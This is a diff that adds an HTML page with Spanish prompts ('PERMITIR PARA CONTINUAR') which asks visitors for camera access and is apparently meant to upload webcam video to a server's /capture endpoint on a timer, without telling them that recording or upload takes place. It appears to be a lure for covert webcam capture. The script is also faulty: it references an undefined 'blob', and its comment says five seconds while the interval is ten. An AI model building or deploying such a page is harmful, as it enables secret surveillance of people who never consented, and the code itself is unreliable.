@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Access</title>
+    <style>
+        h1 {
+            font-family: Arial, sans-serif;
+            color: #333;
+            text-align: center;
+            text-shadow: 2px 2px 4px #ccc;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 75vh;
+            margin: 0;
+        }
+
+        video {
+            width: 320px;
+            height: 240px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+    </style>
+
+</head>
+<body>
+<h1>PERMITIR PARA CONTINUAR</h1>
+<video autoplay playsinline controls id="videoElement"></video>
+<button onclick="requestCameraAccess()">CONTINUAR</button>
+
+<script>
+    const video = document.getElementById('videoElement');
+
+    // Función para capturar y enviar el vídeo al servidor
+    function captureAndSend() {
+        // Detener el video
+        video.pause();
+
+        // Crear un objeto FormData para enviar el vídeo al servidor
+        const formData = new FormData();
+        formData.append('videoData', blob);
+
+        // Enviar el vídeo al servidor Flask usando fetch
+        fetch('/capture', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(data);
+            console.log('Video guardado correctamente');
+        })
+        .catch(error => {
+            console.error('Error al guardar el vídeo:', error);
+        });
+    }
+
+    // Obtener acceso a la cámara y mostrar el video en el elemento <video>
+    navigator.mediaDevices.getUserMedia({video: true})
+        .then(stream => {
+            video.srcObject = stream;
+        })
+        .catch(err => {
+            console.error('Error al acceder a la cámara:', err);
+        });
+
+    // Función para solicitar acceso a la cámara al hacer clic en el botón "CONTINUAR"
+    function requestCameraAccess() {
+        navigator.mediaDevices.getUserMedia({video: true})
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+            })
+            .catch(err => {
+                console.error('Error al acceder a la cámara:', err);
+            });
+    }
+
+    // Capturar automáticamente cada 5 segundos
+    setInterval(captureAndSend, 10000);
+</script>
+</body>
+</html>
